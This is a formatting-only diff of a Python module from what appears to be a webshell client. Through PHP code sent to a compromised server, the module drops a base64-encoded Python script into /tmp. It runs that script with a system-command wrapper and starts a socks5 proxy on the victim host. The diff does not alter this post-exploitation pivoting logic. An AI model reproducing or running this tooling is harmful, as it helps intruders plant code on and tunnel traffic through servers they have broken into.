@@ -27,14 +27,17 @@ def run(port: int = 8888):
     if flag:
         python = get_python(port)
         pyname = "check.py"
-        res = send(f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{base64_encode(python)}\")));")
+        res = send(
+            f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{base64_encode(python)}\")));")
         if (not res):
             return
         text = res.r_text.strip()
         if not len(text):
             print(color.red("Failed to write file in /tmp directory."))
             return
-        t = Thread(target=send, args=(get_system_code(f"python /tmp/{pyname}"),))
+        t = Thread(
+            target=send, args=(
+                get_system_code(f"python /tmp/{pyname}"),))
         t.setDaemon(True)
         t.start()
         t2 = Thread(
@@ -44,7 +47,8 @@ def run(port: int = 8888):
         t2.start()
         sleep(1)
         if (t.is_alive()):
-            print(f"\nStart socks5 server listen on {port} {color.green('success')}.\n")
+            print(
+                f"\nStart socks5 server listen on {port} {color.green('success')}.\n")
         else:
             print(f"\nStart socks5 server {color.red('error')}.\n")
     else:
